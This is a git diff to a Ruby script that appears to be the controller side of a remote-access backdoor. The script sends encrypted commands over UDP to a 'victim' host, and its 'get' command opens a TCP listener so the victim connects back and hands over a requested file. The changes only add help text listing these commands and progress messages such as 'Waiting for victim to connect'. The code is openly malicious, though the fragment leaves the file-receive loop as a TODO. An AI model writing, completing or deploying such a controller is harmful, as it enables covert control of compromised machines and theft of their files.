@@ -38,7 +38,11 @@ while 1 do
 	if cmds[0] == "quit" or cmd[0] == "q" then # Quit terminal
 		abort("Quitting...")
 	elsif cmds[0] == "help" or cmds[0] == "h" then # Show commands
-		print "Help...here"
+		print "\nCommands:\n\n"
+		print "\tquit/q: Quit the application\n"
+		print "\thelp/h: Show list of commonly used commands\n"
+		print "\tget [filename] <port>: Gets a specified file from the victim\n"
+		print "\tls [directory]: Gets a listing of the files and directorie of a specific directory\n"
 	elsif cmds[0] == "get" then # Get file
 		data = dis.encrypt(cmd)
 		udp.send(data, 0, opts[:host], opts[:cport])
@@ -47,13 +51,16 @@ while 1 do
 		tcp = TCPServer.new cmds[2]
 		
 		# Wait for victim to connect
+		print "Waiting for victim to connect...\n"
 		victim = tcp.accept
+		print "Client connected...\n"
 		name = cmds[1]
 	
 		# Open File for writing
 		file = File.open(name, "wb")
 		print("Receiving File: " + name)
 
+		print "Transferring data...\n"
 		# TODO:
 		# 	Run until victim disconnects
 		# 	Write to file upon receving
@@ -68,6 +75,7 @@ while 1 do
 
 		# Close connection
 		tcp.close
+		print "Data transfer complete!\n"
 	else # Normal commands
 		data = dis.encrypt(cmd)
 		udp.send(data, 0, opts[:host], opts[:fport])
